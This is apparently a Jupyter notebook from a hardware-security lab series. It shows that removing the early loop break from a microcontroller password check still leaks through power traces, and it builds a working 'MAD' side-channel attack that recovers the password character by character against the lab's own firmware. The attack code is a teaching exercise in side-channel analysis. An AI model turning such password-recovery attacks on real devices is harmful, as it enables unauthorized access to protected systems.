{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Attack Password with ~~Timing Analysis~~ Difference Analysis III (MAD)\n",
    "\n",
    "In this example we want to improve the `basic-passwdcheck` to be resistant against the attack from the last tutorial.\n",
    "\n",
    "## Improving the code\n",
    "\n",
    "Let's first recap the password checking loop from `basic-passwdcheck`:\n",
    "```c\n",
    "for(uint8_t i = 0; i < sizeof(correct_passwd); i++){\n",
    "    if (correct_passwd[i] != passwd[i]){\n",
    "        passbad = 1;\n",
    "        break;\n",
    "    }\n",
    "}\n",
    "```\n",
    "\n",
    "The timing attack discussed in the last example worked because the loop's runtime varies with the number of correct characters. Once the first wrong character occurs the loop breaks.\n",
    "This is, what we want to change:\n",
    "\n",
    "```c\n",
    "for(uint8_t i = 0; i < sizeof(correct_passwd); i++){\n",
    "    if (correct_passwd[i] != passwd[i]){\n",
    "        passbad = 1;\n",
    "    }\n",
    "}\n",
    "```\n",
    "\n",
    "This is an excerpt from `advanced-passwdcheck.c`. It is clear that the loop does not break after the first wrong character and always all characters of the password are checked. In [Try the old Timing Attack](#Try-the-old-Timing-Attack) we can see that the old timing attack does not work anymore."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Basic Setup"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Define Variables"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%run \"Init.ipynb\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Build target and upload"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "TARGET = 'advanced-passwdcheck'\n",
    "%store TARGET\n",
    "%run \"Passwordcheck_Prepare.ipynb\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Import helper functions"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%run \"../helper_scripts/Setup_Generic.ipynb\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "scope.adc.samples = 400"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Helper Functions for Password Attack"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from bokeh.plotting import figure, show \n",
    "from bokeh.io import output_notebook\n",
    "from bokeh.models import CrosshairTool, Label\n",
    "\n",
    "output_notebook()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def cap_pass_trace(pass_guess, fPrint = False):\n",
    "    ret = \"\"\n",
    "    reset_target(scope)\n",
    "    num_char = target.in_waiting()\n",
    "    while num_char > 0:\n",
    "        ret += target.read(num_char, 10)\n",
    "        time.sleep(0.01)\n",
    "        num_char = target.in_waiting()\n",
    "\n",
    "    if fPrint == True:\n",
    "        print(ret)\n",
    "    \n",
    "    scope.arm()\n",
    "    target.flush()\n",
    "    target.write(pass_guess)\n",
    "    ret = scope.capture()\n",
    "    if ret:\n",
    "        print('Timeout happened during acquisition')\n",
    "\n",
    "    trace = scope.get_last_trace()\n",
    "    \n",
    "    ret = \"\"\n",
    "    num_char = target.in_waiting()\n",
    "    while num_char > 0:\n",
    "        ret += target.read(num_char, 10)\n",
    "        time.sleep(0.01)\n",
    "        num_char = target.in_waiting()\n",
    "    \n",
    "    return trace, ret"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def sad(trace1, trace2):\n",
    "    return sum(abs(trace1 - trace2))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Try the old Timing Attack\n",
    "\n",
    "Let's try again to see a difference in terms of SAD between a correct and a wrong character."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "outputbuf = \"\"\n",
    "trace1, _ = cap_pass_trace('a\\n', False)\n",
    "trace2, _ = cap_pass_trace('b\\n', False)\n",
    "trace3, _ = cap_pass_trace('i\\n', False)\n",
    "p = figure()\n",
    "p.add_tools(CrosshairTool())\n",
    "p.line(range(len(trace1)), abs(trace1 - trace2), color='blue',\n",
    "       legend='abs(trace1 - trace2) with SAD = {:.2f}'.format(sad(trace1, trace2)))\n",
    "p.line(range(len(trace1)), abs(trace1 - trace3), color='red', \n",
    "       legend='abs(trace1 - trace3) with SAD = {:.2f}'.format(sad(trace1, trace3)))\n",
    "show(p)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "If you run this maybe more than one time you will see that the SAD is around 8-10 and the difference between the SADs is far too low to distinguish right from wrong characters.\n",
    "\n",
    "Did we found a \"secure\" solution where an attacker cannot reveal the password?\n",
    "The answer is simple: No. It's just a bit harder. We just have to tweak the attack a bit. You might recognize a high peek at around position 70 in the plot above. This peek is much higher in the red plot than in the blue one.\n",
    "\n",
    "We can use this peek to still get the attack working."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import numpy\n",
    "def cap_pass_trace_multiple(guess, repetitions):\n",
    "    traces = 0\n",
    "    output = ''\n",
    "    for _ in range(repetitions):\n",
    "        t, o = cap_pass_trace(guess, False)\n",
    "        traces += t\n",
    "        output += o\n",
    "    return traces, output"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In the style of SAD (sum of absolute differences) we call this MAD: Maximum of absolute differences."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def mad(trace1, trace2):\n",
    "    return max(abs(trace1 - trace2))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "If we record more than one trace per attempt we can sum all recorded traces for the same attempt and find out that the peek and especially the difference between the peek hights becomes significant:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "outputbuf = \"\"\n",
    "trace1, out1 = cap_pass_trace_multiple('\\x74\\n', 3)\n",
    "trace2, out2 = cap_pass_trace_multiple('a\\n', 3)\n",
    "trace3, out3 = cap_pass_trace_multiple('i\\n', 3)\n",
    "\n",
    "p = figure()\n",
    "p.add_tools(CrosshairTool())\n",
    "p.line(range(len(trace1)), abs(trace1 - trace2), color='blue',\n",
    "       legend='abs(trace1 - trace2) with MAD = {:.2f}'.format(mad(trace1, trace2)))\n",
    "p.line(range(len(trace1)), abs(trace1 - trace3), color='red', \n",
    "       legend='abs(trace1 - trace3) with MAD = {:.2f}'.format(mad(trace1, trace3)))\n",
    "show(p)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "This can be used to program a "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now we can program an automated version of the password cracker again:\n",
    "\n",
    "## MAD password attack\n",
    "\n",
    "1. Start capturing a wrong character. Let's call this `base_trace`.\n",
    "2. Capture further characters and calculate the MAD between this and `base_trace`.\n",
    "3. Start from beginning incorporating the found right character.\n",
    "\n",
    "This is very similar to the SAD attack. Except we use a different criterion of distinction and everytime we say 'capture a trace' we mean 'capture a few traces and sum them up'."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def mad_attack(check_level=0.1, base_char='\\x74'):\n",
    "    trylist = 'abcdefghijklmnopqrstuvwxyz0123456789'\n",
    "    password = ''\n",
    "    outputbuf = ''\n",
    "\n",
    "    while 'Welcome' not in outputbuf:\n",
    "        # Capture base_trace with definitly wrong next character\n",
    "        base_trace, _ = cap_pass_trace_multiple(password + base_char + '\\n', 2)\n",
    "\n",
    "        for c in trylist:\n",
    "            # Try character\n",
    "            trace, outputbuf = cap_pass_trace_multiple(password + c + '\\n', 2)\n",
    "            # Check if c is correct\n",
    "            if mad(base_trace, trace) > check_level:\n",
    "                print(\"Success: \" + c)\n",
    "                password += c\n",
    "                break\n",
    "\n",
    "    print('Successfully broken password: ' + password)\n",
    "\n",
    "mad_attack()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We did not tell why `\\x74` is a good base character! To give an answer to this question we have to do a detailed analysis:\n",
    "\n",
    "## Analyze good base characters"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "First we define a function to print out and analyze the *quality* of a single base character."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "import tqdm\n",
    "import pandas\n",
    "\n",
    "def test_base_char(base_char):\n",
    "    trylist = 'abcdefghijklmnopqrstuvwxyz0123456789'\n",
    "    stats = []\n",
    "    base_trace, _ = cap_pass_trace_multiple(base_char + '\\n', 2)\n",
    "    for c in tqdm.tqdm_notebook(trylist):\n",
    "        stats.append(('{:02x}'.format(ord(base_char)), c, mad(base_trace, cap_pass_trace_multiple(c + '\\n', 2)[0])))\n",
    "    df = pandas.DataFrame(stats, columns=['base_char', 'char', 'mad'])\n",
    "    df = df.sort_values(by='mad', ascending=False)\n",
    "    return df\n",
    "\n",
    "stats = test_base_char('\\xff')\n",
    "stats"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "This can be also put nicely in a plot:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import bokeh.palettes\n",
    "import bokeh.transform\n",
    "import bokeh.models\n",
    "\n",
    "df = stats.copy().sort_values('char')\n",
    "\n",
    "colormap = bokeh.transform.linear_cmap(\n",
    "    field_name='mad', \n",
    "    palette=bokeh.palettes.Oranges6, \n",
    "    low=max(df['mad']),\n",
    "    high=min(df['mad'])\n",
    ")\n",
    "\n",
    "p = figure(x_range=df['char'], title='foo')\n",
    "p.add_tools(CrosshairTool())\n",
    "p.vbar(x='char', top='mad', source=df, width=0.5, color=colormap)\n",
    "show(p)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Analyze *all* possible base characters"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import tqdm\n",
    "import pandas as pd\n",
    "\n",
    "def analyse_all_base_chars(\n",
    "    base_list=list(map(chr, range(1, 256))), \n",
    "    trylist='abcdefghijklmnopqrstuvwxyz0123456789',\n",
    "    filename='mad_chars_stats.dat',\n",
    "):\n",
    "    stats = []\n",
    "    for base_char in tqdm.tqdm_notebook(base_list):\n",
    "        base_trace, _ = cap_pass_trace_multiple(base_char + '\\n', 2)\n",
    "        for c in tqdm.tqdm_notebook(trylist):\n",
    "            stats.append(('{:02x}'.format(ord(base_char)), c, mad(base_trace, cap_pass_trace_multiple(c + '\\n', 2)[0])))\n",
    "\n",
    "    stats = pd.DataFrame(stats, columns=['base_char', 'char', 'mad'])\n",
    "    stats.to_pickle(filename)\n",
    "\n",
    "# Commented because it takes very long\n",
    "# analyse_all_base_chars()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pandas as pd\n",
    "mad_chars_stats = pd.read_pickle('mad_chars_stats.dat')\n",
    "mad_chars_stats"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from bokeh.models import LinearColorMapper\n",
    "\n",
    "df = mad_chars_stats.copy()\n",
    "# df['mad'] = list(range(10))\n",
    "df['base_char'] = ['0x%02x' % ord(x) for x in df['base_char']]\n",
    "\n",
    "colormap = LinearColorMapper(\n",
    "    palette=bokeh.palettes.PuRd5,\n",
    "    low=max(df['mad']),\n",
    "    high=min(df['mad']),\n",
    ")\n",
    "\n",
    "p = figure(\n",
    "    x_range=df['base_char'].unique(),\n",
    "    y_range=df['char'].unique(),\n",
    "    plot_width=950,\n",
    "    plot_height=500,\n",
    ")\n",
    "\n",
    "p.rect(x='base_char', y='char', source=df, width=1, height=1, \n",
    "       fill_color={'field': 'mad', 'transform': colormap},\n",
    "       line_color=None)\n",
    "show(p)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "What can we see in the above heatmap:\n",
    "* Dark rects represent a high MAD value.\n",
    "* Light rects represent a low MAD value.\n",
    "* We can see the correct character `i`.\n",
    "* \"Good\" columns are those which do not have many dark rects.\n",
    "* The \"best\" base character is the column where the highest MAD is the most difference from the value that gives `i`.\n",
    "\n",
    "The \"best\" base character can be also found programmatically:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "import numpy\n",
    "import pandas\n",
    "\n",
    "df = mad_chars_stats\n",
    "stats = []\n",
    "for base_char in df['base_char'].unique():\n",
    "    vals = numpy.sort(df[df['base_char'] == base_char]['mad'])\n",
    "    stats.append((hex(ord(base_char)), vals[-1], vals[-2], vals[-1] - vals[-2]))\n",
    "\n",
    "df = pandas.DataFrame(stats, columns=['base_char', 'max', 'max2', 'diffdiff'])\n",
    "df = df.sort_values(by=['diffdiff'], ascending=False)\n",
    "df"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Disconnect"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "scope.dis()\n",
    "target.dis()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  },
  "toc": {
   "base_numbering": 1,
   "nav_menu": {},
   "number_sections": true,
   "sideBar": true,
   "skip_h1_title": false,
   "title_cell": "Table of Contents",
   "title_sidebar": "Contents",
   "toc_cell": false,
   "toc_position": {},
   "toc_section_display": true,
   "toc_window_display": false
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
